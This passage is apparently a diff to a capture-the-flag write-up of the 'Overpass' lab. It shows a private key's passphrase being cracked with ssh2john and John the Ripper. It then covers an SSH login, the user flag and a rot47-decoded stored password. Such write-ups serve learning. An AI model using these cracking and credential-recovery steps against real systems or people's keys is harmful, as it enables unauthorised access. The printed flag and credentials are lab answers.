@@ -132,3 +132,46 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
 -----END RSA PRIVATE KEY-----
 ```
+
+I used ssh2john to fomat the key and then I used john the ripper to crack the password for the key.
+```
+└─$ ./../john*/run/john -wordlist:/usr/share/wordlists/rockyou.txt keyInJohnFormat                                                                            
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+james13          (/home/gomez22/overpass/id_rsa)     
+1g 0:00:00:00 DONE (2022-08-18 09:50) 50.00g/s 672000p/s 672000c/s 672000C/s 120806..waiting
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+`james:james13`
+
+
+We're able to ssh in as james now.
+user.txt
+```
+thm{65c1aaf000506e56996822c6281e6bf7}
+```
+
+todo.txt
+```
+james@overpass-prod:~$ cat todo.txt
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+
+```
+
+/home/james/.overpass
+`,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`
+
+I decrypted this using rot47
+`[{"name":"System","pass":"saydrawnlyingpicture"}]`
